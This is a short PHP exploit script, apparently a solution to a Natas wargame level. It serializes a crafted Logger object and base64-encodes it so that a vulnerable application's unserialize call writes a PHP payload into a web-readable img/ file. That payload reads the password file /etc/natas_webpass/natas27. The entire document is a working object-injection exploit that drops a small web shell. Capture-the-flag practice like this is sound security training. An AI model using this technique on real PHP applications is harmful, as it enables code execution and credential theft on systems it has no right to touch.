<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($a, $b, $c) {
        $this->logFile = $a;
        $this->initMsg = $b;
        $this->exitMsg = $c;
    }
}

$shellcode = '<?php $s = file_get_contents("/etc/natas_webpass/natas27"); print($s); ?>';

$l = new Logger("img/$argv[1]", '', $shellcode);

$enc = base64_encode(serialize($l));

print($enc);
